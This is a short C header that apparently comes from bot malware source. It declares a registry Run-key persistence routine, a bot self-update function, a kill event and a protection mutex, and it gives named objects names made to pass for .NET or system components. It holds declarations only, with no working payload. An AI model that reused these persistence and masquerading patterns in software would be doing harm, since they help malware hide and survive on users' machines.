#ifndef SYSTEM_H_INCLUDED
#define SYSTEM_H_INCLUDED

void MakeMeArun();
int GetMemSize();

int UnicodeToAnsi(const LPWSTR source,int sourceSize,LPSTR dest,int destSize);

extern TCHAR szValueName[40],szRunKey[];
void UpdateBot(LPVOID lpData,DWORD dwSize);

extern HANDLE hProtectionMutex,hKillEvent;

#define KILL_EVENT_NAME _T("Core_Public_IPCBlock_0")
#define GLOBAL_BOT_MAPPING_NAME _T(".NET Memory Cache 2.0_Perf_Library_Lock_PID_0")

struct GLOBAL_BOT_MAPPING
{
    TCHAR szRegValName[40];
};

extern GLOBAL_BOT_MAPPING *lpGlobalBotMapping;

#endif // SYSTEM_H_INCLUDED
